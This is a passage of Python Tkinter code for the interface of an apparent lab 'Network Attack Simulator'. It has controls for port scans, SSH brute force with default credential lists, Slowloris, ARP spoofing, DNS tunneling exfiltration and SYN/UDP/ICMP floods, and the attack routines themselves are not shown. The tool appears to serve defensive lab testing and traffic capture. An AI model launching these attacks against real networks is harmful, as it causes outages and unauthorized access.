screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
window_width = screen_width // 2
window_height = screen_height - 80
x_position = screen_width // 2
y_position = 0
root.geometry(f"{window_width}x{window_height}+{x_position}+{y_position}")

root.minsize(800, 600)

BG_COLOR = "#1e1e2e"
CARD_BG = "#2b2b3c"
ACCENT_COLOR = "#89b4fa"
SUCCESS_COLOR = "#a6e3a1"
ERROR_COLOR = "#f38ba8"
WARNING_COLOR = "#fab387"
TEXT_COLOR = "#cdd6f4"

root.configure(bg=BG_COLOR)

style = ttk.Style(root)
style.theme_use("clam")

style.configure("TFrame", background=BG_COLOR)
style.configure("TLabel", background=BG_COLOR, foreground=TEXT_COLOR, font=("Segoe UI", 10))
style.configure("Header.TLabel", font=("Segoe UI", 16, "bold"), foreground=ACCENT_COLOR)
style.configure("Card.TLabelframe", background=CARD_BG, relief="flat", borderwidth=2)
style.configure("Card.TLabelframe.Label", font=("Segoe UI", 11, "bold"), foreground=ACCENT_COLOR, background=CARD_BG)
style.configure("TNotebook", background=BG_COLOR, borderwidth=0)
style.configure("TNotebook.Tab", background=CARD_BG, foreground=TEXT_COLOR, padding=[12, 6], font=("Segoe UI", 9, "bold"))
style.map("TNotebook.Tab", background=[("selected", ACCENT_COLOR)], foreground=[("selected", BG_COLOR)])
style.configure("Accent.TButton", font=("Segoe UI", 10, "bold"), background=ACCENT_COLOR, foreground=BG_COLOR, borderwidth=0, padding=[12, 6])
style.map("Accent.TButton", background=[("active", "#74a8e8")])
style.configure("Small.TButton", font=("Segoe UI", 9), background=ACCENT_COLOR, foreground=BG_COLOR, borderwidth=0, padding=[8, 4])
style.map("Small.TButton", background=[("active", "#74a8e8")])
style.configure("Stop.TButton", font=("Segoe UI", 11, "bold"), background=ERROR_COLOR, foreground="#ffffff", borderwidth=0, padding=[14, 8])
style.map("Stop.TButton", background=[("active", "#d63031")])
style.configure("TCheckbutton", background=CARD_BG, foreground=TEXT_COLOR, font=("Segoe UI", 10))
style.configure("TSpinbox", fieldbackground=CARD_BG, foreground=TEXT_COLOR, borderwidth=1)
style.configure("TEntry", fieldbackground=CARD_BG, foreground=TEXT_COLOR, borderwidth=1)
style.configure("TCombobox", fieldbackground=CARD_BG, foreground=TEXT_COLOR, borderwidth=1)

# NEW: Menu bar with positioning options
menubar = tk.Menu(root)
root.config(menu=menubar)

# Window Position menu
position_menu = tk.Menu(menubar, tearoff=0)
menubar.add_cascade(label="📐 Window Position", menu=position_menu)

position_menu.add_command(label="← Snap to LEFT HALF", command=snap_to_left_half)
position_menu.add_command(label="→ Snap to RIGHT HALF (Default)", command=snap_to_right_half)
position_menu.add_separator()
position_menu.add_command(label="↑ Snap to TOP HALF", command=snap_to_top_half)
position_menu.add_command(label="↓ Snap to BOTTOM HALF", command=snap_to_bottom_half)
position_menu.add_separator()
position_menu.add_command(label="↗ Top-Right Quarter", command=snap_to_top_right_quarter)
position_menu.add_command(label="↘ Bottom-Right Quarter", command=snap_to_bottom_right_quarter)
position_menu.add_separator()
position_menu.add_command(label="⬛ MAXIMIZE", command=maximize_window)
position_menu.add_command(label="⊙ CENTER", command=center_window)

header = ttk.Frame(root, padding=(16, 12))
header.pack(fill="x")
ttk.Label(header, text="🔒 Network Attack Simulator - REALISTIC", style="Header.TLabel").pack(side="left")

status_label = ttk.Label(header, text="🟢 Ready", foreground=SUCCESS_COLOR, font=("Segoe UI", 12, "bold"))
status_label.pack(side="left", padx=20)

stop_button = ttk.Button(header, text="🛑 STOP", command=stop_attack, style="Stop.TButton", state="disabled")
stop_button.pack(side="right", padx=8)

ttk.Button(header, text="📁 PCAPs", command=open_pcap_folder, style="Accent.TButton").pack(side="right")

content = ttk.Frame(root, padding=16)
content.pack(fill="both", expand=True)

left = ttk.Frame(content)
left.pack(side="left", fill="both", expand=True, padx=(0, 12))

common_card = ttk.LabelFrame(left, text="⚙ Attack Configuration", style="Card.TLabelframe", padding=12)
common_card.pack(fill="x", pady=(0, 12))

target_var = tk.StringVar(value="192.168.56.101")
label_var = tk.StringVar(value="attack")
safety_var = tk.BooleanVar(value=False)
attack_duration_var = tk.IntVar(value=30)
attack_intensity_var = tk.IntVar(value=10)
save_pcap_var = tk.BooleanVar(value=False)
interface_var = tk.StringVar()

settings_grid = ttk.Frame(common_card)
settings_grid.pack(fill="x")

ttk.Label(settings_grid, text="🎯 Target IP:").grid(row=0, column=0, sticky="w", padx=(0, 6), pady=4)
target_entry = ttk.Entry(settings_grid, textvariable=target_var, width=20, font=("Consolas", 10))
target_entry.grid(row=0, column=1, sticky="w", padx=6, pady=4)

ttk.Button(settings_grid, text="🔎 Check", command=check_target_gui, style="Small.TButton", width=8).grid(row=0, column=2, sticky="w", padx=2, pady=4)

ttk.Label(settings_grid, text="⏱ Duration (s):").grid(row=0, column=3, sticky="w", padx=(12, 6), pady=4)
ttk.Spinbox(settings_grid, from_=5, to=600, textvariable=attack_duration_var, width=10).grid(row=0, column=4, sticky="w", padx=6, pady=4)

ttk.Label(settings_grid, text="💪 Intensity:").grid(row=1, column=0, sticky="w", padx=(0, 6), pady=4)
ttk.Spinbox(settings_grid, from_=1, to=100, textvariable=attack_intensity_var, width=10).grid(row=1, column=1, sticky="w", padx=6, pady=4)

ttk.Label(settings_grid, text="🏷 Label:").grid(row=1, column=3, sticky="w", padx=(12, 6), pady=4)
label_entry = ttk.Entry(settings_grid, textvariable=label_var, width=15)
label_entry.grid(row=1, column=4, sticky="w", padx=6, pady=4)

ttk.Label(settings_grid, text="🌐 Interface:").grid(row=2, column=0, sticky="w", padx=(0, 6), pady=4)
interface_combo = ttk.Combobox(settings_grid, textvariable=interface_var, width=30, state="readonly")
interface_combo.grid(row=2, column=1, columnspan=2, sticky="w", padx=6, pady=4)

refresh_btn = ttk.Button(settings_grid, text="🔄", command=refresh_interfaces, width=3)
refresh_btn.grid(row=2, column=3, sticky="w", padx=6, pady=4)

ttk.Button(settings_grid, text="🔍 Scan All NICs", command=scan_network_gui, style="Small.TButton", width=14).grid(row=2, column=4, sticky="w", padx=6, pady=4)

safety_frame = ttk.Frame(common_card)
safety_frame.pack(fill="x", pady=(12, 0))

safety_check = ttk.Checkbutton(safety_frame, text="✓ Lab authorization", variable=safety_var)
safety_check.pack(side="left")

ttk.Checkbutton(safety_frame, text="💾 Save PCAP", variable=save_pcap_var).pack(side="left", padx=20)

tabs = ttk.Notebook(left)
tabs.pack(fill="both", expand=True)

# Tab 1: Port Scanning
scan_tab = ttk.Frame(tabs, style="TFrame")
tabs.add(scan_tab, text="🔍 Port Scan")
scan_frame = ttk.Frame(scan_tab, padding=16)
scan_frame.pack(fill="both", expand=True)

ports_var = tk.StringVar(value="22,80,443,3389,8080")
scan_delay_var = tk.DoubleVar(value=0.5)

ttk.Label(scan_frame, text="Ports:").grid(row=0, column=0, sticky="w", pady=4)
ttk.Entry(scan_frame, textvariable=ports_var, width=35).grid(row=0, column=1, sticky="w", padx=8, pady=4)
ttk.Label(scan_frame, text="Delay (s):").grid(row=1, column=0, sticky="w", pady=4)
ttk.Spinbox(scan_frame, from_=0.1, to=5.0, increment=0.1, textvariable=scan_delay_var, width=12).grid(row=1, column=1, sticky="w", padx=8, pady=4)
ttk.Button(scan_frame, text="▶ Run", command=run_port_scan, style="Accent.TButton").grid(row=2, column=0, columnspan=2, pady=16)

# Tab 2: SSH Brute Force
brute_tab = ttk.Frame(tabs, style="TFrame")
tabs.add(brute_tab, text="🔐 SSH Brute Force")
brute_frame = ttk.Frame(brute_tab, padding=16)
brute_frame.pack(fill="both", expand=True)

brute_port_var = tk.IntVar(value=22)
brute_users_var = tk.StringVar(value="admin,root,user")
brute_pass_var = tk.StringVar(value="password,123456,admin")
brute_delay_var = tk.DoubleVar(value=2.0)

ttk.Label(brute_frame, text="Port:").grid(row=0, column=0, sticky="w", pady=4)
ttk.Spinbox(brute_frame, from_=1, to=65535, textvariable=brute_port_var, width=12).grid(row=0, column=1, sticky="w", padx=8, pady=4)
ttk.Label(brute_frame, text="Usernames (comma-separated):").grid(row=1, column=0, sticky="w", pady=4)
ttk.Entry(brute_frame, textvariable=brute_users_var, width=35).grid(row=1, column=1, sticky="w", padx=8, pady=4)
ttk.Label(brute_frame, text="Passwords (comma-separated):").grid(row=2, column=0, sticky="w", pady=4)
ttk.Entry(brute_frame, textvariable=brute_pass_var, width=35).grid(row=2, column=1, sticky="w", padx=8, pady=4)
ttk.Label(brute_frame, text="Delay (s):").grid(row=3, column=0, sticky="w", pady=4)
ttk.Spinbox(brute_frame, from_=0.5, to=10.0, increment=0.5, textvariable=brute_delay_var, width=12).grid(row=3, column=1, sticky="w", padx=8, pady=4)
ttk.Button(brute_frame, text="▶ Start SSH Brute Force", command=run_ssh_brute, style="Accent.TButton").grid(row=4, column=0, columnspan=2, pady=16)

# Tab 3: Slowloris
slow_tab = ttk.Frame(tabs, style="TFrame")
tabs.add(slow_tab, text="🐌 Slowloris")
slow_frame = ttk.Frame(slow_tab, padding=16)
slow_frame.pack(fill="both", expand=True)

slow_port_var = tk.IntVar(value=80)
slow_conn_var = tk.IntVar(value=200)

ttk.Label(slow_frame, text="Port:").grid(row=0, column=0, sticky="w", pady=4)
ttk.Spinbox(slow_frame, from_=1, to=65535, textvariable=slow_port_var, width=12).grid(row=0, column=1, sticky="w", padx=8, pady=4)
ttk.Label(slow_frame, text="Connections:").grid(row=1, column=0, sticky="w", pady=4)
ttk.Spinbox(slow_frame, from_=1, to=500, textvariable=slow_conn_var, width=12).grid(row=1, column=1, sticky="w", padx=8, pady=4)
ttk.Button(slow_frame, text="▶ Launch", command=run_slowloris, style="Accent.TButton").grid(row=2, column=0, columnspan=2, pady=16)

# Tab 4: ARP Spoofing
arp_tab = ttk.Frame(tabs, style="TFrame")
tabs.add(arp_tab, text="🎭 ARP Spoof")
arp_frame = ttk.Frame(arp_tab, padding=16)
arp_frame.pack(fill="both", expand=True)

arp_ip_var = tk.StringVar(value="192.168.56.1")
arp_mac_var = tk.StringVar(value="aa:bb:cc:dd:ee:ff")

ttk.Label(arp_frame, text="Target IP:").grid(row=0, column=0, sticky="w", pady=4)
ttk.Entry(arp_frame, textvariable=arp_ip_var, width=25).grid(row=0, column=1, sticky="w", padx=8, pady=4)
ttk.Label(arp_frame, text="Fake MAC:").grid(row=1, column=0, sticky="w", pady=4)
ttk.Entry(arp_frame, textvariable=arp_mac_var, width=25).grid(row=1, column=1, sticky="w", padx=8, pady=4)
ttk.Button(arp_frame, text="▶ Send", command=run_arp, style="Accent.TButton").grid(row=2, column=0, columnspan=2, pady=16)

# Tab 5: DNS Tunneling
dns_tab = ttk.Frame(tabs, style="TFrame")
tabs.add(dns_tab, text="🌐 DNS Tunnel")
dns_frame = ttk.Frame(dns_tab, padding=16)
dns_frame.pack(fill="both", expand=True)

dns_server_var = tk.StringVar(value="8.8.8.8")
dns_domain_var = tk.StringVar(value="tunnel.example.com")

ttk.Label(dns_frame, text="DNS Server:").grid(row=0, column=0, sticky="w", pady=4)
ttk.Entry(dns_frame, textvariable=dns_server_var, width=30).grid(row=0, column=1, sticky="w", padx=8, pady=4)
ttk.Label(dns_frame, text="Domain:").grid(row=1, column=0, sticky="w", pady=4)
ttk.Entry(dns_frame, textvariable=dns_domain_var, width=30).grid(row=1, column=1, sticky="w", padx=8, pady=4)
ttk.Button(dns_frame, text="▶ Simulate", command=run_dns_tunnel, style="Accent.TButton").grid(row=2, column=0, columnspan=2, pady=16)

# Tab 6: SYN Flood
synflood_tab = ttk.Frame(tabs, style="TFrame")
tabs.add(synflood_tab, text="⚡ SYN Flood")
synflood_frame = ttk.Frame(synflood_tab, padding=16)
synflood_frame.pack(fill="both", expand=True)

syn_port_var = tk.IntVar(value=80)
syn_delay_var = tk.DoubleVar(value=0.01)

ttk.Label(synflood_frame, text="Port:").grid(row=0, column=0, sticky="w", pady=4)
ttk.Spinbox(synflood_frame, from_=1, to=65535, textvariable=syn_port_var, width=12).grid(row=0, column=1, sticky="w", padx=8, pady=4)
ttk.Label(synflood_frame, text="Delay (s):").grid(row=1, column=0, sticky="w", pady=4)
ttk.Spinbox(synflood_frame, from_=0.001, to=1.0, increment=0.01, textvariable=syn_delay_var, width=12).grid(row=1, column=1, sticky="w", padx=8, pady=4)
ttk.Button(synflood_frame, text="▶ Launch", command=run_syn_flood, style="Accent.TButton").grid(row=2, column=0, columnspan=2, pady=16)

# Tab 7: UDP Flood
udp_tab = ttk.Frame(tabs, style="TFrame")
tabs.add(udp_tab, text="💥 UDP Flood")
udp_frame = ttk.Frame(udp_tab, padding=16)
udp_frame.pack(fill="both", expand=True)

udp_port_var = tk.IntVar(value=53)
udp_delay_var = tk.DoubleVar(value=0.01)

ttk.Label(udp_frame, text="Port:").grid(row=0, column=0, sticky="w", pady=4)
ttk.Spinbox(udp_frame, from_=1, to=65535, textvariable=udp_port_var, width=12).grid(row=0, column=1, sticky="w", padx=8, pady=4)
ttk.Label(udp_frame, text="Delay (s):").grid(row=1, column=0, sticky="w", pady=4)
ttk.Spinbox(udp_frame, from_=0.001, to=1.0, increment=0.01, textvariable=udp_delay_var, width=12).grid(row=1, column=1, sticky="w", padx=8, pady=4)
ttk.Button(udp_frame, text="▶ Launch", command=run_udp_flood, style="Accent.TButton").grid(row=2, column=0, columnspan=2, pady=16)

# Tab 8: ICMP/DDoS
icmp_tab = ttk.Frame(tabs, style="TFrame")
tabs.add(icmp_tab, text="📡 ICMP DDoS")
icmp_frame = ttk.Frame(icmp_tab, padding=16)
icmp_frame.pack(fill="both", expand=True)

icmp_delay_var = tk.DoubleVar(value=0.01)

ttk.Label(icmp_frame, text="Delay (s):").grid(row=0, column=0, sticky="w", pady=4)
ttk.Spinbox(icmp_frame, from_=0.001, to=1.0, increment=0.01, textvariable=icmp_delay_var, width=12).grid(row=0, column=1, sticky="w", padx=8, pady=4)
ttk.Button(icmp_frame, text="▶ Launch", command=run_icmp_flood, style="Accent.TButton").grid(row=1, column=0, columnspan=2, pady=16)

right = ttk.Frame(content)
right.pack(side="right", fill="both", expand=False)

log_card = ttk.LabelFrame(right, text="📋 Activity Log", style="Card.TLabelframe", padding=12)
log_card.pack(fill="both", expand=True)

ui_log = scrolledtext.ScrolledText(log_card, width=55, height=36, state="disabled", wrap="word", 
                                    background=BG_COLOR, foreground=TEXT_COLOR, 
                                    font=("Consolas", 9), insertbackground=TEXT_COLOR)
ui_log.pack(fill="both", expand=True)

ui_log.tag_config("info", foreground=TEXT_COLOR)
ui_log.tag_config("success", foreground=SUCCESS_COLOR)
ui_log.tag_config("error", foreground=ERROR_COLOR)
ui_log.tag_config("warning", foreground=WARNING_COLOR)

footer = ttk.Frame(root, padding=(16, 10))
footer.pack(fill="x")

ttk.Label(footer, text="💡 Menu → Window Position → Snap to RIGHT HALF (for Chrome on left)", foreground=ACCENT_COLOR).pack(side="left")

def show_help():
    help_text = """Network Attack Simulator - REALISTIC VERSION

📐 WINDOW POSITIONING:
• Menu → Window Position
• Snap to RIGHT HALF (default) - for Chrome on left
• Snap to LEFT HALF
• Snap to TOP/BOTTOM HALF
• Quarter positions available
• Maximize or Center

✅ KEYBOARD SHORTCUTS:
• Ctrl+L: Left Half
• Ctrl+R: Right Half  
• F11: Maximize

✅ REALISTIC IMPLEMENTATIONS:

🔐 SSH BRUTE FORCE:
• Actual SSH authentication attempts (requires paramiko)
• Tests username/password combinations

🐌 SLOWLORIS:
• Keeps connections open with periodic headers
• Maintains connections for full duration

🌐 DNS TUNNELING:
• Base64-encoded data exfiltration
• Alternates query types (A, TXT, NULL, CNAME)

📋 REQUIREMENTS:
• pip install scapy paramiko requests
• Run as Administrator
• Use only in isolated lab environment

⚠ LEGAL WARNING:
Use only on networks you own or have explicit permission to test.
"""
    messagebox.showinfo("Help", help_text)

ttk.Button(footer, text="❓", command=show_help, width=3).pack(side="right", padx=4)
ttk.Button(footer, text="🗑", 
           command=lambda: ui_log.configure(state="normal") or ui_log.delete("1.0", tk.END) or ui_log.configure(state="disabled"), width=3).pack(side="right", padx=4)

# NEW: Keyboard shortcuts
root.bind('<Control-l>', lambda e: snap_to_left_half())
root.bind('<Control-r>', lambda e: snap_to_right_half())
root.bind('<F11>', lambda e: maximize_window())

available_interfaces = get_network_interfaces()
interface_combo['values'] = [iface['display'] for iface in available_interfaces]
if available_interfaces:
    interface_var.set(available_interfaces[0]['display'])

log("🚀 Network Attack Simulator - REALISTIC VERSION loaded", "success")
log("📐 Window positioned to RIGHT HALF (for Chrome on left)", "info")
log("💡 Menu → Window Position for more layouts | Ctrl+L/R shortcuts", "info")
log("🌐 Multi-Interface Discovery + IPv4/IPv6 enabled", "success")
log(f"📡 Detected {len(available_interfaces)} interface(s)", "info")

if HAS_PARAMIKO:
    log("✓ Paramiko installed - SSH brute force available", "success")
else:
    log("⚠ Paramiko NOT installed - SSH brute force will use basic mode", "warning")
    log("   Install with: pip install paramiko", "info")

if HAS_REQUESTS:
    log("✓ Requests installed - HTTP brute force available", "success")
else:
    log("⚠ Requests NOT installed - HTTP brute force will use basic mode", "warning")
    log("   Install with: pip install requests", "info")

log("⚠ WARNING: Use only in isolated lab environment", "warning")
log("💡 Run as Administrator for best results", "info")
log("🔍 Click 'Scan All NICs' to discover devices", "info")

root.mainloop()
